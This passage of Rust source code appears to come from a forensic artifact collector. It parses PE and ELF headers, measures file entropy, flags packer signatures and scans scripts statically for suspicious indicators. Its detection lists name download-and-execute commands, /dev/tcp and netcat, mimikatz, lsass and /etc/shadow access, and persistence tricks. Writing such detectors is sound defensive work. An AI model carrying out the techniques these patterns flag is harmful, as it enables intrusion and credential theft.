                && ["base64", "encodedcommand", "frombase64string", "-enc"]
                    .iter()
                    .any(|marker| line_lower.contains(marker))
            {
                use sha2::Digest;
                let mut hasher = Sha256::new();
                hasher.update(token.as_bytes());
                encoded_strings.push(serde_json::json!({
                    "length": token.len(),
                    "sha256": format!("{:x}", hasher.finalize()),
                }));
            }
        }
        for (prefix, delimiter) in [("$env:", ' '), ("$", ' '), ("%", '%')] {
            let mut rest = line;
            while let Some(start) = rest.to_ascii_lowercase().find(prefix) {
                let after = &rest[start + prefix.len()..];
                let name = if prefix == "%" {
                    after.split(delimiter).next().unwrap_or("")
                } else {
                    after
                        .trim_start_matches('{')
                        .split(|ch: char| !(ch.is_ascii_alphanumeric() || ch == '_'))
                        .next()
                        .unwrap_or("")
                };
                if !name.is_empty() {
                    environment_variables.insert(name.to_string());
                }
                let advance = start + prefix.len() + name.len().max(1);
                if advance >= rest.len() {
                    break;
                }
                rest = &rest[advance..];
            }
        }
    }

    let command_patterns = [
        "curl",
        "wget",
        "invoke-webrequest",
        "downloadstring",
        "invoke-expression",
        "iex",
        "exec",
        "eval",
        "subprocess",
        "os.system",
        "start-process",
        "schtasks",
        "crontab",
        "systemctl",
        "wscript.shell",
        "createobject",
        "socket",
        "requests",
        "urllib",
    ];
    let behavior_patterns: &[(&str, &[&str])] = &[
        (
            "download",
            &[
                "curl ",
                "wget ",
                "invoke-webrequest",
                "downloadstring",
                "urlretrieve",
            ],
        ),
        (
            "execution",
            &[
                "invoke-expression",
                "iex ",
                "exec(",
                "eval(",
                "subprocess",
                "os.system",
                "start-process",
            ],
        ),
        (
            "persistence",
            &[
                "schtasks",
                "crontab",
                "systemctl enable",
                "runonce",
                "startup",
                ".bashrc",
                ".profile",
            ],
        ),
        (
            "credential_access",
            &["lsass", "mimikatz", "/etc/shadow", "sam\\", "password"],
        ),
        (
            "network_operation",
            &["socket", "requests", "urllib", "/dev/tcp", "netcat", "nc -"],
        ),
        (
            "file_operation",
            &["open(", "file.copy", "copy-item", "remove-item", "unlink("],
        ),
        (
            "process_operation",
            &[
                "subprocess",
                "processstartinfo",
                "start-process",
                "createprocess",
            ],
        ),
        (
            "obfuscation",
            &["base64", "encodedcommand", "frombase64string", "charcodeat"],
        ),
    ];
    let lower = content.to_ascii_lowercase();
    for command in command_patterns {
        if lower.contains(command) {
            commands.insert(command.to_string());
        }
    }
    let behaviors: Vec<&str> = behavior_patterns
        .iter()
        .filter_map(|(name, markers)| {
            markers
                .iter()
                .any(|marker| lower.contains(marker))
                .then_some(*name)
        })
        .collect();
    serde_json::json!({
        "line_count": content.lines().count(),
        "commands": commands,
        "urls": urls,
        "domains": domains,
        "ip_addresses": ips,
        "file_or_registry_paths": paths,
        "environment_variables": environment_variables,
        "encoded_strings": encoded_strings,
        "behavior_indicators": behaviors,
        "suspicious": !behaviors.is_empty(),
        "execution_mode": "static_only",
    })
}

/// PE metadata parser
pub fn parse_pe_metadata(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "pe_metadata",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }
    let files = if path.is_file() {
        vec![path.to_path_buf()]
    } else {
        walkdir_max_depth(path, 3)
    };
    let mut results = Vec::new();
    for entry in files {
        if !entry.is_file() {
            continue;
        }
        let ext = entry
            .extension()
            .and_then(|ext| ext.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let bytes = match std::fs::read(&entry) {
            Ok(bytes) => bytes,
            Err(_) => continue,
        };
        if !bytes.starts_with(b"MZ") && !matches!(ext.as_str(), "exe" | "dll" | "sys") {
            continue;
        }
        let sha256 = sha256_file(&entry);
        let size = bytes.len() as u64;
        match parse_pe_bytes(&bytes) {
            Ok(metadata) => results.push(serde_json::to_value(CarvedArtifact {
                artifact_type: "pe_metadata".to_string(),
                path: entry.display().to_string(),
                size_bytes: size,
                sha256,
                modified_at: modified_at(&entry),
                metadata,
                suspicious: false,
                suspicious_reason: None,
            })?),
            Err(error) => results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "pe_metadata",
                "path": entry.display().to_string(),
                "size_bytes": size,
                "sha256": sha256,
                "status": "partial",
                "parse_error": error,
            })),
        }
    }
    if results.is_empty() {
        results.push(serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "pe_metadata",
            "status": "no_artifacts_found",
        }));
    }
    Ok(results)
}

fn pe_rva_to_offset(
    rva: u32,
    size_of_headers: u32,
    sections: &[(u32, u32, u32, u32)],
) -> Result<usize, String> {
    if rva < size_of_headers {
        return Ok(rva as usize);
    }
    for (virtual_address, virtual_size, raw_offset, raw_size) in sections {
        let span = (*virtual_size).max(*raw_size);
        if rva >= *virtual_address && rva - *virtual_address < span {
            return Ok((*raw_offset + (rva - *virtual_address)) as usize);
        }
    }
    Err(format!("PE RVA 0x{:x} does not map to a file offset", rva))
}

fn pe_string_at(bytes: &[u8], offset: usize) -> Result<String, String> {
    let tail = bytes
        .get(offset..)
        .ok_or_else(|| "PE string offset outside file".to_string())?;
    let end = tail
        .iter()
        .position(|byte| *byte == 0)
        .ok_or_else(|| "unterminated PE string".to_string())?;
    Ok(String::from_utf8_lossy(&tail[..end]).into_owned())
}

fn parse_pe_bytes(bytes: &[u8]) -> Result<serde_json::Value, String> {
    if bytes.len() < 64 || !bytes.starts_with(b"MZ") {
        return Err("invalid or truncated DOS header".to_string());
    }
    let pe_offset = read_elf_uint(bytes, 0x3c, 4, true)? as usize;
    let signature_end = pe_offset
        .checked_add(4)
        .ok_or_else(|| "PE signature offset overflow".to_string())?;
    if bytes.get(pe_offset..signature_end) != Some(b"PE\0\0") {
        return Err("invalid PE signature".to_string());
    }
    let coff = signature_end;
    let machine = read_elf_uint(bytes, coff, 2, true)? as u16;
    let section_count = read_elf_uint(bytes, coff + 2, 2, true)? as usize;
    let timestamp = read_elf_uint(bytes, coff + 4, 4, true)? as u32;
    let optional_size = read_elf_uint(bytes, coff + 16, 2, true)? as usize;
    let characteristics = read_elf_uint(bytes, coff + 18, 2, true)? as u16;
    if section_count > 4096 {
        return Err("PE section count exceeds parser limit".to_string());
    }
    let optional = coff
        .checked_add(20)
        .ok_or_else(|| "PE optional-header offset overflow".to_string())?;
    let optional_end = optional
        .checked_add(optional_size)
        .ok_or_else(|| "PE optional-header size overflow".to_string())?;
    if optional_end > bytes.len() {
        return Err("truncated PE optional header".to_string());
    }
    let magic = read_elf_uint(bytes, optional, 2, true)? as u16;
    let (
        format,
        minimum_size,
        directory_start,
        number_directories_offset,
        image_base_offset,
        image_base_width,
    ) = match magic {
        0x10b => ("PE32", 96, 96, 92, 28, 4),
        0x20b => ("PE32+", 112, 112, 108, 24, 8),
        _ => {
            return Err(format!(
                "unsupported PE optional-header magic 0x{:x}",
                magic
            ))
        }
    };
    if optional_size < minimum_size {
        return Err("PE optional header is shorter than its format requires".to_string());
    }
    let entry_point = read_elf_uint(bytes, optional + 16, 4, true)? as u32;
    let image_base = read_elf_uint(bytes, optional + image_base_offset, image_base_width, true)?;
    let size_of_headers = read_elf_uint(bytes, optional + 60, 4, true)? as u32;
    let directory_count =
        read_elf_uint(bytes, optional + number_directories_offset, 4, true)? as usize;
    let directory = |index: usize| -> Result<(u32, u32), String> {
        if directory_count <= index {
            return Ok((0, 0));
        }
        let offset = optional + directory_start + index * 8;
        if offset + 8 > optional_end {
            return Err("truncated PE data-directory table".to_string());
        }
        Ok((
            read_elf_uint(bytes, offset, 4, true)? as u32,
            read_elf_uint(bytes, offset + 4, 4, true)? as u32,
        ))
    };
    let (export_rva, export_size) = directory(0)?;
    let (import_rva, import_size) = directory(1)?;
    let (certificate_offset, certificate_size) = directory(4)?;
    let section_table = optional_end;
    let table_bytes = section_count
        .checked_mul(40)
        .ok_or_else(|| "PE section table size overflow".to_string())?;
    let table_end = section_table
        .checked_add(table_bytes)
        .ok_or_else(|| "PE section table offset overflow".to_string())?;
    if table_end > bytes.len() {
        return Err("truncated PE section table".to_string());
    }

    let mut section_map = Vec::with_capacity(section_count);
    let mut sections = Vec::with_capacity(section_count);
    for index in 0..section_count {
        let offset = section_table + index * 40;
        let raw_name = bytes
            .get(offset..offset + 8)
            .ok_or_else(|| "truncated PE section name".to_string())?;
        let name_end = raw_name
            .iter()
            .position(|byte| *byte == 0)
            .unwrap_or(raw_name.len());
        let name = String::from_utf8_lossy(&raw_name[..name_end]).into_owned();
        let virtual_size = read_elf_uint(bytes, offset + 8, 4, true)? as u32;
        let virtual_address = read_elf_uint(bytes, offset + 12, 4, true)? as u32;
        let raw_size = read_elf_uint(bytes, offset + 16, 4, true)? as u32;
        let raw_offset = read_elf_uint(bytes, offset + 20, 4, true)? as u32;
        let section_flags = read_elf_uint(bytes, offset + 36, 4, true)? as u32;
        section_map.push((virtual_address, virtual_size, raw_offset, raw_size));
        sections.push(serde_json::json!({
            "name": name,
            "virtual_address": virtual_address,
            "virtual_size": virtual_size,
            "raw_offset": raw_offset,
            "raw_size": raw_size,
            "characteristics": format!("0x{:08x}", section_flags),
        }));
    }

    let mut imported_dlls = Vec::new();
    if import_rva != 0 && import_size >= 20 {
        let import_offset = pe_rva_to_offset(import_rva, size_of_headers, &section_map)?;
        let maximum = (import_size as usize / 20).min(4096);
        for index in 0..maximum {
            let descriptor = import_offset
                .checked_add(index * 20)
                .ok_or_else(|| "PE import table offset overflow".to_string())?;
            let name_rva = read_elf_uint(bytes, descriptor + 12, 4, true)? as u32;
            let original_thunk = read_elf_uint(bytes, descriptor, 4, true)? as u32;
            let first_thunk = read_elf_uint(bytes, descriptor + 16, 4, true)? as u32;
            if name_rva == 0 && original_thunk == 0 && first_thunk == 0 {
                break;
            }
            imported_dlls.push(pe_string_at(
                bytes,
                pe_rva_to_offset(name_rva, size_of_headers, &section_map)?,
            )?);
        }
    }

    let mut exported_names = Vec::new();
    if export_rva != 0 && export_size >= 40 {
        let export_offset = pe_rva_to_offset(export_rva, size_of_headers, &section_map)?;
        let name_count = (read_elf_uint(bytes, export_offset + 24, 4, true)? as usize).min(4096);
        let names_rva = read_elf_uint(bytes, export_offset + 32, 4, true)? as u32;
        let names_offset = pe_rva_to_offset(names_rva, size_of_headers, &section_map)?;
        for index in 0..name_count {
            let name_rva = read_elf_uint(bytes, names_offset + index * 4, 4, true)? as u32;
            exported_names.push(pe_string_at(
                bytes,
                pe_rva_to_offset(name_rva, size_of_headers, &section_map)?,
            )?);
        }
    }

    let machine_name = match machine {
        0x014c => "x86",
        0x8664 => "x86_64",
        0x01c0 | 0x01c4 => "ARM",
        0xaa64 => "AArch64",
        _ => "unknown",
    };
    Ok(serde_json::json!({
        "file_type": format,
        "machine": machine_name,
        "machine_id": format!("0x{:04x}", machine),
        "timestamp": timestamp,
        "entry_point_rva": format!("0x{:x}", entry_point),
        "image_base": format!("0x{:x}", image_base),
        "is_dll": characteristics & 0x2000 != 0,
        "section_count": section_count,
        "sections": sections,
        "import_directory": { "rva": import_rva, "size": import_size },
        "imported_dlls": imported_dlls,
        "export_directory": { "rva": export_rva, "size": export_size },
        "exported_names": exported_names,
        "certificate_table": { "file_offset": certificate_offset, "size": certificate_size },
    }))
}

/// ELF metadata parser
pub fn parse_elf_metadata(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "elf_metadata",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }
    let mut results = Vec::new();
    let entries = if path.is_file() {
        vec![path.to_path_buf()]
    } else {
        walkdir_max_depth(path, 3)
    };
    for entry in entries {
        if entry.is_file() {
            if let Ok(bytes) = std::fs::read(&entry) {
                if bytes.starts_with(b"\x7fELF") {
                    let sha256 = sha256_file(&entry);
                    let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
                    match parse_elf_bytes(&bytes) {
                        Ok(metadata) => results.push(serde_json::to_value(CarvedArtifact {
                            artifact_type: "elf_metadata".to_string(),
                            path: entry.display().to_string(),
                            size_bytes: size,
                            sha256,
                            modified_at: modified_at(&entry),
                            metadata,
                            suspicious: false,
                            suspicious_reason: None,
                        })?),
                        Err(error) => results.push(serde_json::json!({
                            "collector": "artifacts",
                            "artifact_type": "elf_metadata",
                            "path": entry.display().to_string(),
                            "size_bytes": size,
                            "sha256": sha256,
                            "status": "partial",
                            "parse_error": error,
                        })),
                    }
                }
            }
        }
    }

    if results.is_empty() {
        results.push(serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "elf_metadata",
            "status": "no_artifacts_found",
        }));
    }

    Ok(results)
}

fn read_elf_uint(
    bytes: &[u8],
    offset: usize,
    width: usize,
    little_endian: bool,
) -> Result<u64, String> {
    let end = offset
        .checked_add(width)
        .ok_or_else(|| "ELF field offset overflow".to_string())?;
    let field = bytes
        .get(offset..end)
        .ok_or_else(|| format!("truncated ELF field at offset {}", offset))?;
    let value = if little_endian {
        field.iter().enumerate().fold(0u64, |value, (index, byte)| {
            value | ((*byte as u64) << (index * 8))
        })
    } else {
        field
            .iter()
            .fold(0u64, |value, byte| (value << 8) | *byte as u64)
    };
    Ok(value)
}

#[allow(dead_code)]
fn parse_elf_bytes(bytes: &[u8]) -> Result<serde_json::Value, String> {
    if bytes.len() < 16 || !bytes.starts_with(b"\x7fELF") {
        return Err("invalid or truncated ELF identification".to_string());
    }
    let class = match bytes[4] {
        1 => 32,
        2 => 64,
        _ => return Err(format!("unsupported ELF class {}", bytes[4])),
    };
    let little_endian = match bytes[5] {
        1 => true,
        2 => false,
        _ => return Err(format!("unsupported ELF byte order {}", bytes[5])),
    };
    if bytes[6] != 1 {
        return Err(format!(
            "unsupported ELF identification version {}",
            bytes[6]
        ));
    }

    let header_size = if class == 32 { 52 } else { 64 };
    if bytes.len() < header_size {
        return Err(format!("truncated ELF{} header", class));
    }
    let file_type = read_elf_uint(bytes, 16, 2, little_endian)? as u16;
    let machine = read_elf_uint(bytes, 18, 2, little_endian)? as u16;
    let (
        entry,
        program_offset,
        section_offset,
        flags_offset,
        header_size_offset,
        program_entry_size_offset,
        program_count_offset,
        section_entry_size_offset,
        section_count_offset,
        section_names_index_offset,
    ) = if class == 32 {
        (24, 28, 32, 36, 40, 42, 44, 46, 48, 50)
    } else {
        (24, 32, 40, 48, 52, 54, 56, 58, 60, 62)
    };
    let word_width = if class == 32 { 4 } else { 8 };
    let entry_address = read_elf_uint(bytes, entry, word_width, little_endian)?;
    let program_offset = read_elf_uint(bytes, program_offset, word_width, little_endian)? as usize;
    let section_offset = read_elf_uint(bytes, section_offset, word_width, little_endian)? as usize;
    let flags = read_elf_uint(bytes, flags_offset, 4, little_endian)?;
    let declared_header_size = read_elf_uint(bytes, header_size_offset, 2, little_endian)?;
    let program_entry_size =
        read_elf_uint(bytes, program_entry_size_offset, 2, little_endian)? as usize;
    let program_count = read_elf_uint(bytes, program_count_offset, 2, little_endian)? as usize;
    let section_entry_size =
        read_elf_uint(bytes, section_entry_size_offset, 2, little_endian)? as usize;
    let section_count = read_elf_uint(bytes, section_count_offset, 2, little_endian)? as usize;
    let section_names_index =
        read_elf_uint(bytes, section_names_index_offset, 2, little_endian)? as usize;

    if declared_header_size < header_size as u64 {
        return Err(format!("invalid ELF header size {}", declared_header_size));
    }
    if program_count > 0 && program_entry_size < if class == 32 { 32 } else { 56 } {
        return Err(format!(
            "invalid program header entry size {}",
            program_entry_size
        ));
    }
    if section_count > 0 && section_entry_size < if class == 32 { 40 } else { 64 } {
        return Err(format!(
            "invalid section header entry size {}",
            section_entry_size
        ));
    }
    if program_count > 65_536 || section_count > 65_536 {
        return Err("ELF header table entry count exceeds parser limit".to_string());
    }

    let table_end = |offset: usize, count: usize, stride: usize| -> Result<usize, String> {
        let length = count
            .checked_mul(stride)
            .ok_or_else(|| "ELF table size overflow".to_string())?;
        let end = offset
            .checked_add(length)
            .ok_or_else(|| "ELF table offset overflow".to_string())?;
        if end > bytes.len() {
            return Err("truncated ELF header table".to_string());
        }
        Ok(end)
    };
    if program_count > 0 {
        table_end(program_offset, program_count, program_entry_size)?;
    }
    if section_count > 0 {
        table_end(section_offset, section_count, section_entry_size)?;
    }

    let mut interpreter = None;
    let mut program_headers = Vec::with_capacity(program_count);
    for index in 0..program_count {
        let base = program_offset + index * program_entry_size;
        let segment_type = read_elf_uint(bytes, base, 4, little_endian)? as u32;
        let (file_offset, file_size) = if class == 32 {
            (
                read_elf_uint(bytes, base + 4, 4, little_endian)?,
                read_elf_uint(bytes, base + 16, 4, little_endian)?,
            )
        } else {
            (
                read_elf_uint(bytes, base + 8, 8, little_endian)?,
                read_elf_uint(bytes, base + 32, 8, little_endian)?,
            )
        };
        let segment_name = match segment_type {
            0 => "NULL",
            1 => "LOAD",
            2 => "DYNAMIC",
            3 => "INTERP",
            4 => "NOTE",
            5 => "SHLIB",
            6 => "PHDR",
            7 => "TLS",
            _ => "OTHER",
        };
        if segment_type == 3 {
            let start =
                usize::try_from(file_offset).map_err(|_| "ELF interpreter offset is too large")?;
            let length =
                usize::try_from(file_size).map_err(|_| "ELF interpreter size is too large")?;
            let end = start
                .checked_add(length)
                .ok_or_else(|| "ELF interpreter range overflow".to_string())?;
            let value = bytes
                .get(start..end)
                .ok_or_else(|| "truncated ELF interpreter segment".to_string())?;
            interpreter = Some(
                String::from_utf8_lossy(value)
                    .trim_end_matches('\0')
                    .to_string(),
            );
        }
        program_headers.push(serde_json::json!({
            "type": segment_name,
            "type_id": segment_type,
            "offset": file_offset,
            "file_size": file_size,
        }));
    }

    let section_name_offset = 0;
    let section_type_offset = 4;
    let section_file_offset = if class == 32 { 16 } else { 24 };
    let section_size_offset = if class == 32 { 20 } else { 32 };
    let section_word_width = if class == 32 { 4 } else { 8 };
    let section_names = if section_count > 0 && section_names_index < section_count {
        let names_header = section_offset + section_names_index * section_entry_size;
        let names_file_offset = read_elf_uint(
            bytes,
            names_header + section_file_offset,
            section_word_width,
            little_endian,
        )? as usize;
        let names_size = read_elf_uint(
            bytes,
            names_header + section_size_offset,
            section_word_width,
            little_endian,
        )? as usize;
        let names_end = names_file_offset
            .checked_add(names_size)
            .ok_or_else(|| "ELF section-name table range overflow".to_string())?;
        Some(
            bytes
                .get(names_file_offset..names_end)
                .ok_or_else(|| "truncated ELF section-name string table".to_string())?,
        )
    } else {
        None
    };

    let mut sections = Vec::with_capacity(section_count);
    for index in 0..section_count {
        let base = section_offset + index * section_entry_size;
        let name_index =
            read_elf_uint(bytes, base + section_name_offset, 4, little_endian)? as usize;
        let section_type =
            read_elf_uint(bytes, base + section_type_offset, 4, little_endian)? as u32;
        let file_offset = read_elf_uint(
            bytes,
            base + section_file_offset,
            section_word_width,
            little_endian,
        )?;
        let size = read_elf_uint(
            bytes,
            base + section_size_offset,
            section_word_width,
            little_endian,
        )?;
        let name = section_names
            .and_then(|table| table.get(name_index..))
            .map(|remaining| {
                let end = remaining
                    .iter()
                    .position(|byte| *byte == 0)
                    .unwrap_or(remaining.len());
                String::from_utf8_lossy(&remaining[..end]).into_owned()
            })
            .unwrap_or_default();
        let type_name = match section_type {
            0 => "NULL",
            1 => "PROGBITS",
            2 => "SYMTAB",
            3 => "STRTAB",
            4 => "RELA",
            5 => "HASH",
            6 => "DYNAMIC",
            7 => "NOTE",
            8 => "NOBITS",
            9 => "REL",
            11 => "DYNSYM",
            _ => "OTHER",
        };
        sections.push(serde_json::json!({
            "name": name,
            "type": type_name,
            "type_id": section_type,
            "offset": file_offset,
            "size": size,
        }));
    }

    let file_type_name = match file_type {
        0 => "none",
        1 => "relocatable",
        2 => "executable",
        3 => "shared_object",
        4 => "core",
        _ => "processor_specific",
    };
    let machine_name = match machine {
        3 => "x86",
        40 => "ARM",
        62 => "x86_64",
        183 => "AArch64",
        243 => "RISC-V",
        _ => "unknown",
    };
    Ok(serde_json::json!({
        "file_type": "elf",
        "class": class,
        "endianness": if little_endian { "little" } else { "big" },
        "elf_type": file_type_name,
        "elf_type_id": file_type,
        "machine": machine_name,
        "machine_id": machine,
        "entry_point": format!("0x{:x}", entry_address),
        "flags": flags,
        "interpreter": interpreter,
        "program_headers": program_headers,
        "sections": sections,
    }))
}

/// Code signature verifier
pub fn verify_code_signature(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "code_signature",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }
    {
        let mut results = Vec::new();
        for entry in walkdir_max_depth(path, 3) {
            if entry.is_file() {
                let sha256 = sha256_file(&entry);
                let size = entry.metadata().map(|m| m.len()).unwrap_or(0);

                results.push(serde_json::to_value(CarvedArtifact {
                    artifact_type: "code_signature".to_string(),
                    path: entry.display().to_string(),
                    size_bytes: size,
                    sha256,
                    modified_at: modified_at(&entry),
                    metadata: serde_json::json!({
                        "note": "Code signature verification not fully implemented",
                    }),
                    suspicious: false,
                    suspicious_reason: None,
                })?);
            }
        }

        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "code_signature",
                "status": "no_artifacts_found",
            }));
        }

        Ok(results)
    }
}

/// File entropy analyzer
pub fn analyze_file_entropy(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "file_entropy",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }
    {
        let mut results = Vec::new();
        for entry in walkdir_max_depth(path, 3) {
            if entry.is_file() {
                let bytes = std::fs::read(&entry).unwrap_or_default();
                if bytes.is_empty() {
                    continue;
                }

                // Calculate Shannon entropy
                let mut freq = [0u64; 256];
                for &b in &bytes {
                    freq[b as usize] += 1;
                }
                let len = bytes.len() as f64;
                let mut entropy = 0.0;
                for &count in &freq {
                    if count > 0 {
                        let p = count as f64 / len;
                        entropy -= p * p.log2();
                    }
                }

                let sha256 = sha256_file(&entry);
                let size = entry.metadata().map(|m| m.len()).unwrap_or(0);

                let suspicious = entropy > 7.0; // High entropy suggests packing/encryption

                results.push(serde_json::to_value(CarvedArtifact {
                    artifact_type: "file_entropy".to_string(),
                    path: entry.display().to_string(),
                    size_bytes: size,
                    sha256,
                    modified_at: modified_at(&entry),
                    metadata: serde_json::json!({
                        "entropy": entropy,
                        "max_entropy": 8.0,
                    }),
                    suspicious,
                    suspicious_reason: if suspicious {
                        Some(format!(
                            "High entropy ({:.2}) suggests packing or encryption",
                            entropy
                        ))
                    } else {
                        None
                    },
                })?);
            }
        }

        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "file_entropy",
                "status": "no_artifacts_found",
            }));
        }

        Ok(results)
    }
}

/// Rootkit indicator detector
pub fn detect_rootkit_indicators(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "rootkit_indicators",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }
    {
        let mut results = Vec::new();

        // Check for common rootkit indicators
        results.push(serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "rootkit_indicators",
            "status": "not_implemented",
            "note": "Rootkit detection requires kernel-level access and is not fully implemented",
            "checks": [
                "hidden_processes",
                "hidden_files",
                "hidden_ports",
                "ssdt_hooks",
                "idt_hooks",
                "dkom",
            ],
        }));

        Ok(results)
    }
}

fn detect_packer_signatures(bytes: &[u8]) -> Vec<String> {
    let text = String::from_utf8_lossy(bytes).to_ascii_lowercase();
    const PACKER_PATTERNS: &[(&str, &str)] = &[
        ("upx", "upx0"),
        ("upx", "upx1"),
        ("upx", "upx2"),
        ("upx", "upx3"),
        ("upx", "upx!"),
        ("aspack", "aspack"),
        ("aspack", "asprotect"),
        ("fsg", "fsg!"),
        ("pecompact", "pecompact"),
        ("nspack", "nspack"),
        ("mpress", "mpress"),
        ("kkrunchy", "kkrunchy"),
        ("winupack", "winupack"),
        ("themida", "themida"),
    ];

    let mut hits = Vec::new();
    for (label, pattern) in PACKER_PATTERNS {
        if text.contains(pattern) {
            hits.push(label.to_string());
        }
    }
    hits.sort();
    hits.dedup();
    hits
}

/// Binary anomaly detector
pub fn detect_binary_anomalies(
    search_path: &str,
) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
    let path = Path::new(search_path);
    if !path.exists() {
        return Ok(vec![serde_json::json!({
            "collector": "artifacts",
            "artifact_type": "binary_anomalies",
            "status": "path_not_found",
            "search_path": search_path,
        })]);
    }
    {
        let mut results = Vec::new();
        for entry in walkdir_max_depth(path, 3) {
            if entry.is_file() {
                let ext = entry.extension().and_then(|e| e.to_str()).unwrap_or("");
                if ext == "exe" || ext == "dll" || ext == "so" || ext == "bin" || ext == "sys" {
                    let bytes = std::fs::read(&entry).unwrap_or_default();
                    if bytes.is_empty() {
                        continue;
                    }

                    let mut freq = [0u64; 256];
                    for &b in &bytes {
                        freq[b as usize] += 1;
                    }
                    let len = bytes.len() as f64;
                    let mut entropy = 0.0;
                    for &count in &freq {
                        if count > 0 {
                            let p = count as f64 / len;
                            entropy -= p * p.log2();
                        }
                    }

                    let sha256 = sha256_file(&entry);
                    let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
                    let packer_hits = detect_packer_signatures(&bytes);
                    let mut anomalies = Vec::new();
                    if entropy > 7.0 {
                        anomalies.push("high_entropy".to_string());
                    }
                    if !packer_hits.is_empty() {
                        anomalies.push("packing_signature".to_string());
                    }
                    let suspicious = !anomalies.is_empty();

                    results.push(serde_json::to_value(CarvedArtifact {
                        artifact_type: "binary_anomalies".to_string(),
                        path: entry.display().to_string(),
                        size_bytes: size,
                        sha256,
                        modified_at: modified_at(&entry),
                        metadata: serde_json::json!({
                            "entropy": entropy,
                            "file_type": ext,
                            "anomalies": anomalies,
                            "packer_signatures": packer_hits,
                        }),
                        suspicious,
                        suspicious_reason: if suspicious {
                            let mut reasons = Vec::new();
                            if entropy > 7.0 {
                                reasons.push(format!("high entropy ({:.2})", entropy));
                            }
                            if !packer_hits.is_empty() {
                                reasons
                                    .push(format!("packer signature ({})", packer_hits.join(", ")));
                            }
                            Some(format!("Binary anomaly indicators: {}", reasons.join("; ")))
                        } else {
                            None
                        },
                    })?);
                }
            }
        }

        if results.is_empty() {
            results.push(serde_json::json!({
                "collector": "artifacts",
                "artifact_type": "binary_anomalies",
                "status": "no_artifacts_found",
            }));
        }

        Ok(results)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal_pe32_plus() -> Vec<u8> {
        let pe_offset = 0x80usize;
        let coff = pe_offset + 4;
        let optional = coff + 20;
        let optional_size = 0xf0usize;
        let section = optional + optional_size;
        let mut bytes = vec![0u8; section + 40];
        bytes[0..2].copy_from_slice(b"MZ");
        bytes[0x3c..0x40].copy_from_slice(&(pe_offset as u32).to_le_bytes());
        bytes[pe_offset..pe_offset + 4].copy_from_slice(b"PE\0\0");
        bytes[coff..coff + 2].copy_from_slice(&0x8664u16.to_le_bytes());
        bytes[coff + 2..coff + 4].copy_from_slice(&1u16.to_le_bytes());
        bytes[coff + 16..coff + 18].copy_from_slice(&(optional_size as u16).to_le_bytes());
        bytes[coff + 18..coff + 20].copy_from_slice(&0x2022u16.to_le_bytes());
        bytes[optional..optional + 2].copy_from_slice(&0x20bu16.to_le_bytes());
        bytes[optional + 16..optional + 20].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[optional + 24..optional + 32].copy_from_slice(&0x140000000u64.to_le_bytes());
        bytes[optional + 60..optional + 64].copy_from_slice(&0x200u32.to_le_bytes());
        bytes[optional + 108..optional + 112].copy_from_slice(&16u32.to_le_bytes());
        bytes[section..section + 5].copy_from_slice(b".text");
        bytes[section + 8..section + 12].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[section + 12..section + 16].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[section + 16..section + 20].copy_from_slice(&0x200u32.to_le_bytes());
        bytes[section + 20..section + 24].copy_from_slice(&0x200u32.to_le_bytes());
        bytes[section + 36..section + 40].copy_from_slice(&0x60000020u32.to_le_bytes());
        bytes
    }

    #[test]
    fn test_pe_parser_reads_pe32_plus_header_and_sections() {
        let metadata = parse_pe_bytes(&minimal_pe32_plus()).unwrap();
        assert_eq!(metadata["file_type"], "PE32+");
        assert_eq!(metadata["machine"], "x86_64");
        assert_eq!(metadata["entry_point_rva"], "0x1000");
        assert_eq!(metadata["sections"][0]["name"], ".text");
        assert_eq!(metadata["sections"][0]["raw_size"], 0x200);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn test_parse_elf_metadata_reads_real_executable() {
        let executable = std::env::current_exe().unwrap();
        let records = parse_elf_metadata(executable.to_str().unwrap()).unwrap();
        let metadata = records[0].get("metadata").expect("ELF metadata record");

        assert_eq!(metadata["file_type"], "elf");
        assert!(metadata["class"].as_u64().is_some());
        assert!(metadata["machine"].as_str().is_some());
        assert!(metadata["sections"]
            .as_array()
            .is_some_and(|sections| !sections.is_empty()));
    }

    #[test]
    fn test_parse_elf_metadata_rejects_truncated_input() {
        let error = parse_elf_bytes(b"\x7fELF").unwrap_err();
        assert!(error.contains("truncated"));
    }

    #[test]
    fn test_static_script_analysis_extracts_indicators_without_payload() {
        let encoded = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=";
        let content = format!(
